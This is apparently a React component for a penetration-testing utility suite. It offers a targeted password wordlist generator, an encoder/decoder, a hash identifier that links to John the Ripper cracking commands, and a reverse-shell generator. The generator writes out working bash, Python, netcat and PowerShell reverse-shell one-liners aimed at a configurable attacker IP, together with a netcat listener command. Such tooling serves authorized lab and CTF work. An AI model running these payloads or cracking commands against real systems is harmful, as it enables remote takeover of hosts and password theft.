import React, { useState } from 'react';
import { Wrench, Key, Lock, Terminal, Copy, Check, RefreshCw, FileText } from 'lucide-react';

export function UtilitiesSuite({ onSendToTerminal }) {
  const [activeTool, setActiveTool] = useState('wordlist');
  const [copiedKey, setCopiedKey] = useState(null);

  // Copy helper
  const handleCopy = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // --- 1. Custom Wordlist Generator State ---
  const [wlTarget, setWlTarget] = useState('admin');
  const [wlYears, setWlYears] = useState('2024,2025,2026');
  const [wlSpecial, setWlSpecial] = useState('@,!,#,123');
  const [wlIncludeLeet, setWlIncludeLeet] = useState(true);
  const [generatedWordlist, setGeneratedWordlist] = useState([]);

  const generateWordlist = () => {
    const words = new Set();
    const baseWords = wlTarget.split(',').map(w => w.trim()).filter(Boolean);
    const years = wlYears.split(',').map(y => y.trim()).filter(Boolean);
    const specials = wlSpecial.split(',').map(s => s.trim()).filter(Boolean);

    baseWords.forEach(b => {
      // standard case variations
      const variations = [
        b.toLowerCase(),
        b.toUpperCase(),
        b.charAt(0).toUpperCase() + b.slice(1).toLowerCase()
      ];

      // leetspeak
      if (wlIncludeLeet) {
        const leet = b.toLowerCase()
          .replaceAll('a', '@')
          .replaceAll('e', '3')
          .replaceAll('i', '1')
          .replaceAll('o', '0')
          .replaceAll('s', '$');
        variations.push(leet);
      }

      variations.forEach(v => {
        words.add(v);
        years.forEach(y => {
          words.add(`${v}${y}`);
          words.add(`${v}_${y}`);
          specials.forEach(s => {
            words.add(`${v}${s}`);
            words.add(`${v}${y}${s}`);
            words.add(`${v}${s}${y}`);
          });
        });
        specials.forEach(s => words.add(`${v}${s}`));
      });
    });

    setGeneratedWordlist(Array.from(words));
  };

  // --- 2. Encoder / Decoder State ---
  const [encodeInput, setEncodeInput] = useState('admin:password123');
  const [encodeType, setEncodeType] = useState('base64');
  const getEncodedResult = () => {
    try {
      if (encodeType === 'base64') return btoa(encodeInput);
      if (encodeType === 'base64_decode') return atob(encodeInput);
      if (encodeType === 'url') return encodeURIComponent(encodeInput);
      if (encodeType === 'url_decode') return decodeURIComponent(encodeInput);
      if (encodeType === 'hex') return Array.from(encodeInput).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
      if (encodeType === 'rot13') {
        return encodeInput.replace(/[a-zA-Z]/g, function(c){
          return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);
        });
      }
    } catch (e) {
      return "Error: Invalid input for this decoding scheme.";
    }
    return "";
  };

  // --- 3. Hash Identifier State ---
  const [hashInput, setHashInput] = useState('5f4dcc3b5aa765d61d8327deb882cf99');
  const identifyHash = (h) => {
    const clean = h.trim();
    if (/^[a-fA-F0-9]{32}$/.test(clean)) return { type: "MD5 or NTLM", length: 32, security: "Broken / Vulnerable" };
    if (/^[a-fA-F0-9]{40}$/.test(clean)) return { type: "SHA-1", length: 40, security: "Deprecated / Weak" };
    if (/^[a-fA-F0-9]{64}$/.test(clean)) return { type: "SHA-256", length: 64, security: "Secure (Standard)" };
    if (/^\$2[ayb]\$.{56}$/.test(clean)) return { type: "bcrypt", length: 60, security: "High (Slow Key Derivation)" };
    if (/^[a-fA-F0-9]{128}$/.test(clean)) return { type: "SHA-512", length: 128, security: "Very High" };
    return { type: "Unknown / Unrecognized Hash Format", length: clean.length, security: "N/A" };
  };

  // --- 4. Reverse Shell Generator State ---
  const [revIP, setRevIP] = useState('10.10.14.25');
  const [revPort, setRevPort] = useState('4444');
  const [revType, setRevType] = useState('bash');

  const getReverseShellCommand = () => {
    switch (revType) {
      case 'bash':
        return `bash -i >& /dev/tcp/${revIP}/${revPort} 0>&1`;
      case 'python':
        return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${revIP}",${revPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
      case 'netcat':
        return `nc -e /bin/bash ${revIP} ${revPort}`;
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${revIP}",${revPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      default:
        return `bash -i >& /dev/tcp/${revIP}/${revPort} 0>&1`;
    }
  };

  return (
    <div className="max-w-7xl mx-auto px-4 py-6">
      {/* Top Banner */}
      <div className="mb-6">
        <div className="flex items-center space-x-3 mb-2">
          <Wrench className="w-6 h-6 text-cyber-green" />
          <h1 className="text-xl sm:text-2xl font-bold text-white">
            Cyber Utilities & Wordlist Generator Suite
          </h1>
        </div>
        <p className="text-xs sm:text-sm text-slate-400">
          Essential penetration testing utilities: custom wordlist crafter, hash identifier, payload encoder/decoder, and reverse shell generator.
        </p>

        {/* Tool Switcher Tabs */}
        <div className="flex items-center space-x-2 overflow-x-auto mt-4 pb-2 text-xs font-mono">
          <button
            onClick={() => setActiveTool('wordlist')}
            className={`flex items-center space-x-2 px-3 py-2 rounded-lg border transition-all ${
              activeTool === 'wordlist'
                ? 'bg-cyber-green/15 border-cyber-green text-cyber-green font-semibold shadow-sm'
                : 'bg-[#111622] border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            <FileText className="w-3.5 h-3.5" />
            <span>Wordlist Generator</span>
          </button>

          <button
            onClick={() => setActiveTool('encoder')}
            className={`flex items-center space-x-2 px-3 py-2 rounded-lg border transition-all ${
              activeTool === 'encoder'
                ? 'bg-cyber-green/15 border-cyber-green text-cyber-green font-semibold shadow-sm'
                : 'bg-[#111622] border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            <Lock className="w-3.5 h-3.5" />
            <span>Encoder / Decoder</span>
          </button>

          <button
            onClick={() => setActiveTool('hasher')}
            className={`flex items-center space-x-2 px-3 py-2 rounded-lg border transition-all ${
              activeTool === 'hasher'
                ? 'bg-cyber-green/15 border-cyber-green text-cyber-green font-semibold shadow-sm'
                : 'bg-[#111622] border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            <Key className="w-3.5 h-3.5" />
            <span>Hash Identifier</span>
          </button>

          <button
            onClick={() => setActiveTool('revshell')}
            className={`flex items-center space-x-2 px-3 py-2 rounded-lg border transition-all ${
              activeTool === 'revshell'
                ? 'bg-cyber-cyan/15 border-cyber-cyan text-cyber-cyan font-semibold shadow-sm'
                : 'bg-[#111622] border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            <span>Reverse Shell Crafter</span>
          </button>
        </div>
      </div>

      {/* TOOL 1: Wordlist Generator */}
      {activeTool === 'wordlist' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Controls (5 cols) */}
          <div className="lg:col-span-5 bg-[#0a0d14] rounded-xl border border-cyber-border p-5 shadow-xl space-y-4">
            <h3 className="font-bold text-white text-sm font-mono flex items-center space-x-2">
              <FileText className="w-4 h-4 text-cyber-green" />
              <span>Target Profiling Parameters</span>
            </h3>

            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1">
                Target Keywords / Names (comma separated):
              </label>
              <input
                type="text"
                value={wlTarget}
                onChange={(e) => setWlTarget(e.target.value)}
                placeholder="admin, company, target, john"
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-green font-mono"
              />
            </div>

            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1">
                Relevant Years:
              </label>
              <input
                type="text"
                value={wlYears}
                onChange={(e) => setWlYears(e.target.value)}
                placeholder="2024, 2025, 2026"
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-green font-mono"
              />
            </div>

            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1">
                Special Characters / Suffixes:
              </label>
              <input
                type="text"
                value={wlSpecial}
                onChange={(e) => setWlSpecial(e.target.value)}
                placeholder="@, !, #, 123"
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs text-white focus:outline-none focus:border-cyber-green font-mono"
              />
            </div>

            <label className="flex items-center space-x-2 text-xs text-slate-300 cursor-pointer">
              <input
                type="checkbox"
                checked={wlIncludeLeet}
                onChange={(e) => setWlIncludeLeet(e.target.checked)}
                className="rounded border-slate-700 text-cyber-green focus:ring-0 bg-slate-900"
              />
              <span>Enable Leetspeak Variations (e.g. admin -&gt; @dm1n)</span>
            </label>

            <button
              onClick={generateWordlist}
              className="w-full py-2.5 rounded-lg bg-cyber-green hover:bg-cyber-greenDim text-slate-950 font-bold text-xs flex items-center justify-center space-x-2 transition-all shadow-md font-mono"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Generate Wordlist Dictionary</span>
            </button>
          </div>

          {/* Output Preview (7 cols) */}
          <div className="lg:col-span-7 bg-[#0a0d14] rounded-xl border border-cyber-border p-5 shadow-xl flex flex-col h-[450px]">
            <div className="flex items-center justify-between border-b border-[#1e293b] pb-3 mb-3">
              <div className="text-xs font-mono text-slate-300">
                Generated Passwords: <strong className="text-cyber-green">{generatedWordlist.length} entries</strong>
              </div>
              {generatedWordlist.length > 0 && (
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => handleCopy(generatedWordlist.join('\n'), 'wl')}
                    className="flex items-center space-x-1 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition-colors"
                  >
                    {copiedKey === 'wl' ? <Check className="w-3.5 h-3.5 text-cyber-green" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copiedKey === 'wl' ? 'Copied' : 'Copy All'}</span>
                  </button>
                  <button
                    onClick={() => onSendToTerminal(`john --wordlist=/usr/share/wordlists/rockyou-sample.txt hash.txt`)}
                    className="flex items-center space-x-1 px-2.5 py-1 rounded bg-cyber-green/15 hover:bg-cyber-green/25 border border-cyber-green/40 text-cyber-green text-xs font-mono font-semibold transition-all"
                  >
                    <Terminal className="w-3.5 h-3.5" />
                    <span>Test in John</span>
                  </button>
                </div>
              )}
            </div>

            <div className="flex-1 bg-[#0d121c] p-3 rounded-lg border border-slate-800 overflow-y-auto font-mono text-xs text-cyber-green space-y-1">
              {generatedWordlist.length === 0 ? (
                <div className="text-slate-500 text-center py-20">
                  Click "Generate Wordlist Dictionary" to build targeted passwords.
                </div>
              ) : (
                generatedWordlist.map((w, idx) => (
                  <div key={idx} className="hover:bg-slate-800/40 px-1 rounded flex justify-between">
                    <span>{w}</span>
                    <span className="text-slate-600 text-[10px]">#{idx + 1}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* TOOL 2: Encoder / Decoder */}
      {activeTool === 'encoder' && (
        <div className="bg-[#0a0d14] rounded-xl border border-cyber-border p-6 shadow-xl space-y-5">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <h3 className="font-bold text-white text-base font-mono">Payload Encoder & Decoder</h3>
            <div className="flex items-center space-x-2 text-xs font-mono">
              <span className="text-slate-400">Scheme:</span>
              <select
                value={encodeType}
                onChange={(e) => setEncodeType(e.target.value)}
                className="bg-[#111622] border border-slate-800 rounded px-2.5 py-1 text-white focus:outline-none focus:border-cyber-green font-mono"
              >
                <option value="base64">Base64 Encode</option>
                <option value="base64_decode">Base64 Decode</option>
                <option value="url">URL Encode</option>
                <option value="url_decode">URL Decode</option>
                <option value="hex">Hex ASCII</option>
                <option value="rot13">ROT13 Cipher</option>
              </select>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <div>
              <label className="text-xs text-slate-300 font-medium block mb-2 font-mono">Input Text / Payload:</label>
              <textarea
                rows={6}
                value={encodeInput}
                onChange={(e) => setEncodeInput(e.target.value)}
                className="w-full bg-[#111622] border border-slate-800 rounded-lg p-3 text-xs sm:text-sm font-mono text-white focus:outline-none focus:border-cyber-green"
              />
            </div>

            <div>
              <div className="flex items-center justify-between mb-2">
                <label className="text-xs text-slate-300 font-medium font-mono">Transformed Output:</label>
                <button
                  onClick={() => handleCopy(getEncodedResult(), 'enc')}
                  className="flex items-center space-x-1 text-xs text-cyber-green font-mono hover:underline"
                >
                  {copiedKey === 'enc' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedKey === 'enc' ? 'Copied!' : 'Copy Result'}</span>
                </button>
              </div>
              <textarea
                readOnly
                rows={6}
                value={getEncodedResult()}
                className="w-full bg-[#0d121c] border border-slate-800 rounded-lg p-3 text-xs sm:text-sm font-mono text-cyan-300 outline-none"
              />
            </div>
          </div>
        </div>
      )}

      {/* TOOL 3: Hash Identifier */}
      {activeTool === 'hasher' && (
        <div className="bg-[#0a0d14] rounded-xl border border-cyber-border p-6 shadow-xl space-y-6">
          <div>
            <h3 className="font-bold text-white text-base font-mono mb-2">Cryptographic Hash Identifier</h3>
            <p className="text-xs text-slate-400">
              Paste an unknown hash found in database dumps, shadow files, or CTF challenges to identify its algorithm.
            </p>
          </div>

          <div>
            <label className="text-xs text-slate-300 font-medium block mb-2 font-mono">Enter Hash String:</label>
            <input
              type="text"
              value={hashInput}
              onChange={(e) => setHashInput(e.target.value)}
              className="w-full bg-[#111622] border border-slate-800 rounded-lg px-4 py-3 text-xs sm:text-sm font-mono text-cyber-green focus:outline-none focus:border-cyber-green"
            />
          </div>

          {/* Hash Analysis Result Card */}
          {hashInput.trim() && (() => {
            const res = identifyHash(hashInput);
            return (
              <div className="bg-[#111622] p-5 rounded-xl border border-slate-800 space-y-3">
                <div className="text-xs font-mono uppercase tracking-wider text-slate-400">Analysis Breakdown:</div>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs font-mono">
                  <div className="bg-[#0a0d14] p-3 rounded-lg border border-slate-800">
                    <span className="text-slate-500 block">Identified Type:</span>
                    <strong className="text-cyber-green text-sm">{res.type}</strong>
                  </div>
                  <div className="bg-[#0a0d14] p-3 rounded-lg border border-slate-800">
                    <span className="text-slate-500 block">Hash Length:</span>
                    <strong className="text-white text-sm">{res.length} Characters</strong>
                  </div>
                  <div className="bg-[#0a0d14] p-3 rounded-lg border border-slate-800">
                    <span className="text-slate-500 block">Security Status:</span>
                    <strong className="text-amber-400 text-sm">{res.security}</strong>
                  </div>
                </div>

                <div className="pt-2 flex items-center justify-between">
                  <span className="text-xs text-slate-400">
                    Recommended Cracker: <strong className="text-cyan-400 font-mono">John the Ripper / Hashcat</strong>
                  </span>
                  <button
                    onClick={() => onSendToTerminal(`john --format=raw-md5 hash.txt`)}
                    className="flex items-center space-x-1 px-3 py-1.5 rounded bg-cyber-green/15 border border-cyber-green/40 text-cyber-green text-xs font-mono font-semibold hover:bg-cyber-green/25 transition-all"
                  >
                    <Terminal className="w-3.5 h-3.5" />
                    <span>Crack in Terminal</span>
                  </button>
                </div>
              </div>
            );
          })()}
        </div>
      )}

      {/* TOOL 4: Reverse Shell Generator */}
      {activeTool === 'revshell' && (
        <div className="bg-[#0a0d14] rounded-xl border border-cyber-border p-6 shadow-xl space-y-6">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div>
              <h3 className="font-bold text-white text-base font-mono">Reverse Shell One-Liner Generator</h3>
              <p className="text-xs text-slate-400 mt-1">
                Generate instant reverse connection payloads for authorized penetration testing scenarios.
              </p>
            </div>
            <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-rose-500/10 border border-rose-500/30 text-rose-400">
              For Authorized Lab Environments Only
            </span>
          </div>

          {/* IP & Port Configuration */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1 font-mono">Attacker / Listener IP:</label>
              <input
                type="text"
                value={revIP}
                onChange={(e) => setRevIP(e.target.value)}
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan"
              />
            </div>

            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1 font-mono">Port:</label>
              <input
                type="text"
                value={revPort}
                onChange={(e) => setRevPort(e.target.value)}
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan"
              />
            </div>

            <div>
              <label className="text-xs text-slate-300 font-medium block mb-1 font-mono">Shell Environment:</label>
              <select
                value={revType}
                onChange={(e) => setRevType(e.target.value)}
                className="w-full bg-[#111622] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-cyber-cyan"
              >
                <option value="bash">Bash (-i &gt;& /dev/tcp)</option>
                <option value="python">Python 3 PTY</option>
                <option value="netcat">Netcat (-e /bin/bash)</option>
                <option value="powershell">PowerShell TCPClient</option>
              </select>
            </div>
          </div>

          {/* Generated Payload Box */}
          <div className="bg-[#07090e] p-4 rounded-xl border border-cyber-cyan/40">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-mono text-slate-400">Target Execution Payload:</span>
              <button
                onClick={() => handleCopy(getReverseShellCommand(), 'rev')}
                className="flex items-center space-x-1 text-xs text-cyber-cyan font-mono hover:underline"
              >
                {copiedKey === 'rev' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedKey === 'rev' ? 'Copied!' : 'Copy Payload'}</span>
              </button>
            </div>
            <pre className="bg-[#0d121c] p-3 rounded-lg border border-slate-800 text-xs sm:text-sm font-mono text-cyan-300 overflow-x-auto whitespace-pre-wrap break-all">
              {getReverseShellCommand()}
            </pre>
          </div>

          {/* Listener Command Box */}
          <div className="bg-[#111622] p-4 rounded-xl border border-slate-800 flex items-center justify-between">
            <div className="text-xs font-mono">
              <span className="text-slate-400">Start Listener on your Kali terminal: </span>
              <code className="text-cyber-green font-bold ml-2">nc -lvnp {revPort}</code>
            </div>
            <button
              onClick={() => onSendToTerminal(`nc -lvnp ${revPort}`)}
              className="flex items-center space-x-1.5 px-3 py-1.5 rounded bg-cyber-green hover:bg-cyber-greenDim text-slate-950 font-bold text-xs transition-all font-mono"
            >
              <Terminal className="w-3.5 h-3.5" />
              <span>Launch Listener</span>
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
